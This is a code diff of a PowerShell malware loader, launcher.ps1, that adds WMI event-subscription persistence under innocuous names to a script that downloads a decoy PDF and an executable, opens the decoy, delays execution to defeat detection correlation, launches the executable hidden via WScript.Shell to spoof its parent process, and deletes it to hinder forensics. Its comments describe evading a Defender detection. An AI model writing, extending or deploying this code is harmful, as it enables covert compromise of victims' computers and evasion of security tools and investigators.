@@ -1,7 +1,38 @@
-# launcher.ps1 - Extended delay + WScript.Shell launcher
-# No AMSI bypass, no registry writes, no scheduled tasks
+# launcher.ps1 - Bearfoos evasion + Persistence (WMI Event Subscription)
 $ErrorActionPreference = 'SilentlyContinue'
 
+# === PERSISTENCE: Install once (WMI Event Subscription) ===
+# This runs at every user logon, re-launching this script
+$filterName = "WindowsEventFilter"
+$consumerName = "WindowsEventConsumer"
+$exists = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue
+if (-not $exists) {
+    # Create event filter (triggers on explorer.exe startup)
+    $filterArgs = @{
+        Name = $filterName
+        EventNameSpace = 'root\cimv2'
+        QueryLanguage = 'WQL'
+        Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
+    }
+    $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs
+    
+    # Create consumer that runs this same script
+    $scriptPath = $MyInvocation.MyCommand.Path
+    $consumerArgs = @{
+        Name = $consumerName
+        CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+    }
+    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs
+    
+    # Bind filter to consumer
+    $bindingArgs = @{
+        Filter = $filter
+        Consumer = $consumer
+    }
+    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs
+}
+
+# === ORIGINAL BEARFOOS-EVASIVE LOADER (same as before) ===
 # Random initial delay (2-8 seconds)
 Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 8000)
 
@@ -22,9 +53,7 @@ $exePath = "$cache\helper.exe"
 $headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
 try {
     Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing
-} catch {
-    # Silently continue on error
-}
+} catch {}
 
 # Random delay between downloads (1.5-4 seconds)
 Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)
@@ -32,31 +61,23 @@ Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)
 # Download EXE
 try {
     Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
-} catch {
-    # Silently continue on error
-}
+} catch {}
 
 # Open PDF decoy
-try {
-    Start-Process $pdfPath
-} catch {
-    # Silently continue
-}
+try { Start-Process $pdfPath } catch {}
 
 # CRITICAL: Long delay before launching EXE (45-90 seconds)
-# This breaks the temporal correlation between PowerShell download and EXE execution
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
-# Launch EXE via WScript.Shell (parent becomes explorer.exe, not PowerShell)
+# Launch EXE via WScript.Shell (parent becomes explorer.exe)
 try {
     $wsh = New-Object -ComObject WScript.Shell
     $wsh.Run("`"$exePath`"", 0, $false)
 } catch {
-    # Fallback: direct Start-Process if COM fails
     Start-Process $exePath -WindowStyle Hidden
 }
 
-# Optional: Clean up EXE after 5 minutes (prevents disk forensics)
+# Clean up EXE after 5 minutes (optional)
 Start-Job -ScriptBlock {
     Start-Sleep -Seconds 300
     Remove-Item -Path $args[0] -Force -ErrorAction SilentlyContinue
